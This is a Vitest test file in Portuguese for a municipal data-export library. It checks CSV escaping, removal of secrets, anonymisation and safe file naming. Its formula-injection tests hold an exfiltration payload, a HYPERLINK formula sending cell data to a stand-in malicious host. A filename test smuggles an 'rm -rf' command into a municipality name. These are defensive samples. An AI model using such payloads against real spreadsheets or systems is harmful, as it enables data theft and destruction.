import { describe, it, expect } from "vitest";
import {
  escaparCampoCsv,
  paraCsv,
  higienizarLinhas,
  montarPacote,
  tabelaPorChave,
  nomeArquivo,
  apelidoMunicipio,
  TABELAS_EXPORTAVEIS,
  VERSAO_EXPORTACAO,
} from "@/lib/exportacao";

// O BOM que abre todo CSV — sem ele o Excel em português abre UTF-8 como
// Latin-1 e a prefeitura recebe um arquivo com acentuação quebrada.
const BOM = "﻿";

describe("escape de campo CSV", () => {
  it("deixa texto simples sem aspas", () => {
    expect(escaparCampoCsv("Barro Duro")).toBe("Barro Duro");
  });

  it("representa nulo e indefinido como célula vazia", () => {
    expect(escaparCampoCsv(null)).toBe("");
    expect(escaparCampoCsv(undefined)).toBe("");
  });

  it("não confunde zero e false com vazio", () => {
    // Um `0` virando célula vazia mudaria "nenhuma obra atrasada" em
    // "não informado" na planilha que vai pro TCE.
    expect(escaparCampoCsv(0)).toBe("0");
    expect(escaparCampoCsv(false)).toBe("false");
  });

  it("envolve em aspas quando tem vírgula, ponto e vírgula ou quebra de linha", () => {
    expect(escaparCampoCsv("Rua A, 100")).toBe('"Rua A, 100"');
    expect(escaparCampoCsv("a;b")).toBe('"a;b"');
    expect(escaparCampoCsv("linha 1\nlinha 2")).toBe('"linha 1\nlinha 2"');
  });

  it("dobra as aspas internas, como manda a RFC 4180", () => {
    expect(escaparCampoCsv('obra "emergencial"')).toBe('"obra ""emergencial"""');
  });

  it("preserva espaço nas pontas envolvendo em aspas", () => {
    expect(escaparCampoCsv(" texto ")).toBe('" texto "');
  });
});

describe("injeção de fórmula em planilha", () => {
  // A mensagem da ouvidoria é escrita pelo cidadão: é entrada não confiável
  // que vai parar numa planilha aberta por um servidor da prefeitura.
  it.each(["=1+1", "+1", "-1", "@SUM(A1)"])(
    "neutraliza célula que começa com fórmula: %s",
    (perigoso) => {
      const saida = escaparCampoCsv(perigoso);
      expect(saida.startsWith("'") || saida.startsWith("\"'")).toBe(true);
    }
  );

  it("neutraliza a fórmula clássica de exfiltração do Excel", () => {
    const ataque = '=HYPERLINK("http://malicioso.example/?x="&A1,"clique")';
    const saida = escaparCampoCsv(ataque);
    expect(saida).toContain("'=HYPERLINK");
  });

  it("não mexe em texto que só contém sinal no meio", () => {
    expect(escaparCampoCsv("obra 1-2")).toBe("obra 1-2");
  });
});

describe("geração do CSV", () => {
  it("usa a união das colunas de todas as linhas, não só da primeira", () => {
    // Se olhasse só a primeira linha, `bairro` sumiria do arquivo sem aviso.
    const csv = paraCsv([{ nome: "Escola A" }, { nome: "Escola B", bairro: "Centro" }]);
    const [cabecalho] = csv.replace(BOM, "").split("\r\n");
    expect(cabecalho).toBe("nome,bairro");
    expect(csv).toContain("Escola B,Centro");
    expect(csv).toContain("Escola A,");
  });

  it("abre com BOM e separa linhas com CRLF", () => {
    const csv = paraCsv([{ a: 1 }]);
    expect(csv.startsWith(BOM)).toBe(true);
    expect(csv).toContain("\r\n");
  });

  it("devolve só o BOM quando não há linha nenhuma", () => {
    expect(paraCsv([])).toBe(BOM);
  });

  it("mantém acentuação intacta", () => {
    expect(paraCsv([{ secretaria: "Educação" }])).toContain("Educação");
  });
});

describe("higienização por tabela", () => {
  it("nunca deixa o hash de senha sair na exportação de usuários", () => {
    const [linha] = higienizarLinhas("usuarios", [
      { id: "u1", nome: "Fulano", senhaHash: "$2b$12$hash-secreto", cargo: "prefeito" },
    ]);
    expect(linha).not.toHaveProperty("senhaHash");
    expect(JSON.stringify(linha)).not.toContain("hash-secreto");
    expect(linha.nome).toBe("Fulano");
  });

  it("nunca deixa a chave de consulta sair nos atendimentos", () => {
    // A chave é credencial: com protocolo + chave qualquer pessoa lê a
    // manifestação no portal público.
    const [linha] = higienizarLinhas("atendimentos", [
      { protocolo: "202608-K7M4QP", chaveConsulta: "SEGREDO123", assunto: "Buraco na rua" },
    ]);
    expect(linha).not.toHaveProperty("chaveConsulta");
    expect(JSON.stringify(linha)).not.toContain("SEGREDO123");
  });

  it("apaga a identificação de manifestação anônima mesmo se o banco tiver os campos preenchidos", () => {
    // Lei 13.460/2017: o anonimato não pode depender de o formulário ter
    // deixado os campos vazios.
    const [linha] = higienizarLinhas("atendimentos", [
      {
        protocolo: "202608-AAAAAA",
        anonimo: true,
        nome: "Maria",
        email: "maria@example.com",
        telefone: "85999998888",
        mensagem: "Denúncia",
      },
    ]);
    expect(linha.nome).toBeNull();
    expect(linha.email).toBeNull();
    expect(linha.telefone).toBeNull();
    expect(linha.mensagem).toBe("Denúncia");
  });

  it("trata o 1 do SQLite como anônimo, igual ao boolean do Postgres", () => {
    const [linha] = higienizarLinhas("atendimentos", [
      { anonimo: 1, nome: "Maria", email: "m@example.com", telefone: "85999998888" },
    ]);
    expect(linha.nome).toBeNull();
  });

  it("mantém a identificação quando a manifestação não é anônima", () => {
    const [linha] = higienizarLinhas("atendimentos", [
      { anonimo: false, nome: "João", email: "joao@example.com" },
    ]);
    expect(linha.nome).toBe("João");
    expect(linha.email).toBe("joao@example.com");
  });
});

describe("pacote de exportação", () => {
  const pacote = montarPacote({
    municipio: "Barro Duro",
    geradoPor: "Prefeita Teste",
    geradoEm: "2026-08-29T12:00:00.000Z",
    tabelas: {
      obras: [{ id: "o1", nome: "Reforma da UBS Norte" }],
      usuarios: [{ id: "u1", nome: "Fulano", senhaHash: "$2b$12$segredo" }],
    },
  });

  it("inclui TODA tabela exportável, mesmo as vazias", () => {
    // "Não tem obra cadastrada" e "a exportação esqueceu as obras" precisam
    // ser distinguíveis para quem recebe o arquivo.
    for (const definicao of TABELAS_EXPORTAVEIS) {
      expect(pacote.tabelas).toHaveProperty(definicao.chave);
      expect(Array.isArray(pacote.tabelas[definicao.chave])).toBe(true);
    }
    expect(pacote.tabelas.escolas).toEqual([]);
  });

  it("carrega versão e procedência para quem for importar", () => {
    expect(pacote.versao).toBe(VERSAO_EXPORTACAO);
    expect(pacote.municipio).toBe("Barro Duro");
    expect(pacote.geradoPor).toBe("Prefeita Teste");
    expect(pacote.geradoEm).toBe("2026-08-29T12:00:00.000Z");
    expect(pacote.observacoes.length).toBeGreaterThan(0);
  });

  it("aplica a higienização no pacote inteiro, não só tabela a tabela", () => {
    expect(JSON.stringify(pacote)).not.toContain("segredo");
  });

  it("preserva o conteúdo que é dado do município", () => {
    expect(pacote.tabelas.obras).toEqual([{ id: "o1", nome: "Reforma da UBS Norte" }]);
  });
});

describe("catálogo de tabelas", () => {
  it("não tem chave repetida", () => {
    const chaves = TABELAS_EXPORTAVEIS.map((t) => t.chave);
    expect(new Set(chaves).size).toBe(chaves.length);
  });

  it("resolve chave conhecida e rejeita desconhecida", () => {
    expect(tabelaPorChave("obras")?.rotulo).toBe("Obras");
    expect(tabelaPorChave("tokens_recuperacao_senha")).toBeNull();
    expect(tabelaPorChave("")).toBeNull();
  });
});

describe("nome do arquivo", () => {
  it("tira acento e espaço do município", () => {
    expect(apelidoMunicipio("São João do Piauí")).toBe("sao-joao-do-piaui");
  });

  it("não deixa o nome vazio quando o município só tem símbolo", () => {
    expect(apelidoMunicipio("///")).toBe("municipio");
  });

  it("monta nome legível com a data", () => {
    expect(
      nomeArquivo({
        municipio: "Barro Duro",
        sufixo: "obras",
        extensao: "csv",
        data: new Date("2026-08-29T12:00:00.000Z"),
      })
    ).toBe("cidadeia-barro-duro-obras-2026-08-29.csv");
  });

  it("não produz nome que quebre o cabeçalho Content-Disposition", () => {
    const nome = nomeArquivo({
      municipio: 'Cidade "X"; rm -rf',
      sufixo: "dados-completos",
      extensao: "json",
      data: new Date("2026-01-02T00:00:00.000Z"),
    });
    expect(nome).not.toMatch(/["\s;\\]/);
  });
});
